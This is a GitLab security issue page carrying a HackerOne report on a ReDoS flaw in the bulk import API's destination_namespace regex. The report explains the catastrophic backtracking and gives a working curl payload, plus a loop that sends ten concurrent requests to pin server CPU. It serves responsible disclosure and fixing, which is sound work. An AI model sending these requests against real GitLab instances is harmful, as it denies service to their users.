

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS in bulk import API POST /api/v4/bulk\_imports when validating `destination\_namespace` parameter

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2011464](https://hackerone.com/reports/2011464)** by `joaxcar` on 2023-06-02, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

The regexp for checking the `destination name space` parameter in `bulk import API` is subject to "catastrophic backtracking". The regex is located here <https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/regex.rb#L271> and looks like this

```
def bulk_import_destination_namespace_path_regex
    [@]bulk_import_destination_namespace_path_regex ||= %r/((\A\z)|(\A[0-9a-z]*(-_.)?[0-9a-z])(\/?[0-9a-z]*[-_.]?[0-9a-z])+\z)/i
end
```

its a pretty complex regex but the dangerous part is the nested quantifiers that can be simplified to this `([0-9a-z]*[0-9a-z])+\z` or even more simplified like this `(a*a)+\z`. If this regexp is used on a string that contains a long sequence of alphanumeric characters and then end in a nonalphanumeric character the quantifiers will trigger a catastrophic backtracking issue <https://www.regular-expressions.info/catastrophic.html>. See images 1 and 2 for examples on <https://regex101.com/>

[![img1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/92109695f7a546245c4301f918cc5de4a8ba5ee1/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31346639323263622d346562632d343962392d616438312d6566643063626539316661352f696d67312e706e67)

[![img2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/74012cebb572b11aeb1d8d1dad6903f52594bcbc/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30336466623136372d396639632d343063612d383064322d3262313535646665626638622f696d67322e706e67)

This particular regex is used to validate the `destination_namespace` parameter here <https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/api/bulk_imports.rb#L72>

```
 requires :destination_namespace,
                   type: String,
                   desc: 'Destination namespace for the entity',
                   destination_namespace_path: true,
                   documentation: { example: "'destination_namespace' or 'destination/namespace'" }
```

Given a payload in a request like this

```
curl --request POST  --header "PRIVATE-TOKEN: <TOKEN>" "https://example.gitlab.com/api/v4/bulk_imports" \
  --header "Content-Type: application/json" \
  --data '{
    "configuration": {
      "url": "https://example.com",
      "access_token": "not important"
    },
    "entities": [
      {
        "source_full_path": "test",
        "source_type": "project_entity",
        "destination_slug": "test",
        "destination_namespace": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/"
      }
    ]
  }'
```

it will lock up a `puma` thread at 100% CPU. Making 10 API calls made my Mac M2 pro have a response time of 1 min to load the front page of GitLab.

#### Steps to reproduce

On a local instance, you first need to go to <https://gitlab.example.com/admin/application_settings/general> and enable `Allow migrating GitLab groups and projects by direct transfer` (on Gitlab.com this is turned on)

1. Start a local instance of GitLab (you can use a docker image for this) see <https://docs.gitlab.com/ee/install/docker.html>

```
sudo docker run --detach \
  --hostname gitlab.example.com \
  --publish 4443:443 --publish 8080:80 --publish 2222:22 \
  --name gitlab \
  --restart always \
  --shm-size 256m \
  gitlab/gitlab-ee:latest
```

2. When its booted run this to get the root password needed to log in as admin

```
sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password
```

3. Access the docker terminal with `sudo docker exec -it gitlab /bin/bash` (gitlab here is your container name)
4. Install `htop` with `apt-get update && apt-get install htop`
5. start `htop` with `htop`

Now log in to your instance

6. Log in

7. Create an access token on htts://gitlab.example.com/-/profile/personal\_access\_tokens

Open a new terminal

8. Run this script

```
for i in {1..10}
do
curl --request POST  --header "PRIVATE-TOKEN: glxx...x" "http://localhost:8082/api/v4/bulk_imports" \
    --header "Content-Type: application/json" \
    --data '{
    "configuration": {
      "url": "https://example.com",
      "access_token": "not important"
    },
    "entities": [
      {
        "source_full_path": "test",
        "source_type": "project_entity",
        "destination_slug": "test",
        "destination_namespace": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/"
      }
    ]
  }' &
done
```

9. Go back to the browser and refresh. It should now not respond (see 1 min load time in image)

[![loading.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/bbf7a6410ee7ebfbbe4e435c57e90c8434bd0ba4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65376337613930342d313833382d343262322d613931342d6236363536383863383434632f6c6f6164696e672e706e67)

10. Go to `htop` and see the puma threads working

[![puma.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0b68a13450025c9f24ad463434b07c1e14c89fbd/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30393231303566392d356262632d343931342d613737642d3162303732643335633262622f70756d612e706e67)

#### Impact

ReDoS taking up CPU and causing resource consumption by low amount of requests

#### What is the current *bug* behavior?

The regexp used to validate `destination_namespace` is vulnerable to backtracking issues

#### What is the expected *correct* behavior?

The regexp needs to be rewritten to avoid greedy backtracking

#### Output of checks

This bug happens on GitLab.com

##### Results of GitLab environment info

```
System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	3.0.6p216
Gem Version:	3.4.13
Bundler Version:2.4.13
Rake Version:	13.0.6
Redis Version:	6.2.11
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	16.0.1
Revision:	34d6370bacd
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	13.8
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.20.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

#### Impact

ReDoS hogging up CPU and causing resource consumption by low amount of requests

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [img1.png](https://h1.sec.gitlab.net/a/14f922cb-4ebc-49b9-ad81-efd0cbe91fa5/img1.png)
* [img2.png](https://h1.sec.gitlab.net/a/03dfb167-9f9c-40ca-80d2-2b155dfebf8b/img2.png)
* [puma.png](https://h1.sec.gitlab.net/a/092105f9-5bbc-4914-a77d-1b072d35c2bb/puma.png)
* [loading.png](https://h1.sec.gitlab.net/a/e7c7a904-1838-42b2-a914-b665688c844c/loading.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Oct 14, 2023 by [Kevin Morrison](/kmorrison1)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

